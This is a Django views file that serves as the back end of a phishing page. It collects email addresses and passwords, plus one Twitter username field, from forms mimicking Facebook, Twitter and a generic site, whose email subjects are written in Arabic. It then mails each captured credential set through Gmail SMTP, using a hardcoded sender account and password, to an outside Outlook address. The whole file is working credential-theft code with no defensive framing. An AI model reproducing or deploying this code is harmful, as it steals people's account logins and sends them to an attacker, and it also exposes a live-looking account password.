
from django.shortcuts import render,redirect
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from requests import get
# Create your views here.








def index(request):

    try:
        try:
            try:
                email2 = request.POST.get('email2')
                password2 = request.POST.get('password2')

                ########################
                From = "lidark.tool@gmail.com"
                password = 'mmoohhaa123#123#m'
                To = 'adrelaft@outlook.com'
                msg = MIMEMultipart()
                msg['From'] = From
                msg['To'] = To
                msg['Subject'] = 'لوحة الفيسبوك'
                body = "#######################################\nالبريد الاكتروني : \n" + email2 + '\n#######################################\n-------------------------------------\n#######################################\n' + 'كلمة المرور : \n' + password2+"\n#######################################\n"
                msg.attach(MIMEText(body, 'plain'))
                server = smtplib.SMTP('smtp.gmail.com:587')
                server.starttls()
                server.login(From, password)
                text = msg.as_string()
                server.sendmail(From, To, text)
                print(f'Send Done To {To}')

                server.quit()
                ########################
                return render (request , "temp/index.html" )
            except:
                email1 = request.POST.get('email1')
                password1 = request.POST.get('password1')

                ########################
                From = "lidark.tool@gmail.com"
                password = 'mmoohhaa123#123#m'
                To = 'adrelaft@outlook.com'
                msg = MIMEMultipart()
                msg['From'] = From
                msg['To'] = To
                msg['Subject'] = 'لوحة الموقع'
                body = "#######################################\nالبريد الاكتروني : \n" + email1 + '\n#######################################\n-------------------------------------\n#######################################\n' + 'كلمة المرور : \n' + password1+"\n#######################################\n"
                msg.attach(MIMEText(body, 'plain'))
                server = smtplib.SMTP('smtp.gmail.com:587')
                server.starttls()
                server.login(From, password)
                text = msg.as_string()
                server.sendmail(From, To, text)
                print(f'Send Done To {To}')

                server.quit()
                ########################
                return render (request , "temp/index.html" )
        except:
                email3 = request.POST.get('email3')
                usern3 = request.POST.get('usern3')
                password3 = request.POST.get('password3')

                ########################
                From = "lidark.tool@gmail.com"
                password = 'mmoohhaa123#123#m'
                To = 'adrelaft@outlook.com'
                msg = MIMEMultipart()
                msg['From'] = From
                msg['To'] = To
                msg['Subject'] = 'لوحة تويتر'
                body = "#######################################\nالبريد الاكتروني : \n" + email3 + '\n#######################################\n-------------------------------------\n#######################################\n' + 'كلمة المرور : \n' + password3+"\n#######################################\n"+ "اسم المستخدم في تويتر فقط :\n"+usern3+  "\n#######################################\n"               
                msg.attach(MIMEText(body, 'plain'))
                server = smtplib.SMTP('smtp.gmail.com:587')
                server.starttls()
                server.login(From, password)
                text = msg.as_string()
                server.sendmail(From, To, text)
                print(f'Send Done To {To}')

                server.quit()
                ########################
                return render (request , "temp/index.html" )

    except:
        return render (request , "temp/index.html" )





